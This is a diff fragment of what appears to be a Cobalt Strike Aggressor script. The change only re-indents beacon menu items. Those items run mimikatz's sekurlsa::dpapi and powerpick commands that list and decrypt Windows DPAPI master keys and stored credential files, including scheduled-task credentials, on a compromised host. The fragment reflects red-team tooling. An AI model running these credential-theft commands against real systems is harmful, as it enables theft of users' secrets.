@@ -626,22 +626,22 @@ popup beacon_bottom
 				binput($1, "mimikatz !sekurlsa::dpapi");
                 bmimikatz($1, "!sekurlsa::dpapi");
 	        }
-			item "List Master keys files"
-			{
-				bpowerpick($1, "gci -hidden \$env:appdata/Microsoft/Protect/S-*/*-*-*-*-*,\$env:localappdata/Microsoft/Protect/S-*/*-*-*-*-*", '', '', &result_ps);
-			}
-			item "List Credentials files"
-			{
-				bpowerpick($1, "gci -hidden \$env:appdata/Microsoft/Credentials,\$env:localappdata/Microsoft/Credentials", '', '', &result_ps);
-			}
-			item "Decrypt current user Credentials"
-			{
-				bpowerpick($1, "gci -hidden \$env:appdata/Microsoft/Credentials,\$env:localappdata/Microsoft/Credentials \| foreach \{\$_.FullName\}", '', '', &result_get_creds);
-			}
-			item "Decrypt Scheduled Task Credentials (admin)"
-			{
-				bpowerpick($1, "gci -hidden C:/Windows/System32/config/systemprofile/AppData/Local/Microsoft/Credentials \| foreach \{\$_.FullName\}", '', '', &result_get_task_creds);
-			}
+		item "List Master keys files"
+		{
+			bpowerpick($1, "gci -hidden \$env:appdata/Microsoft/Protect/S-*/*-*-*-*-*,\$env:localappdata/Microsoft/Protect/S-*/*-*-*-*-*", '', '', &result_ps);
+		}
+		item "List Credentials files"
+		{
+			bpowerpick($1, "gci -hidden \$env:appdata/Microsoft/Credentials,\$env:localappdata/Microsoft/Credentials", '', '', &result_ps);
+		}
+		item "Decrypt current user Credentials"
+		{
+			bpowerpick($1, "gci -hidden \$env:appdata/Microsoft/Credentials,\$env:localappdata/Microsoft/Credentials \| foreach \{\$_.FullName\}", '', '', &result_get_creds);
+		}
+		item "Decrypt Scheduled Task Credentials (admin)"
+		{
+			bpowerpick($1, "gci -hidden C:/Windows/System32/config/systemprofile/AppData/Local/Microsoft/Credentials \| foreach \{\$_.FullName\}", '', '', &result_get_task_creds);
+		}
 		}
 		menu "ADCS"
 	    {
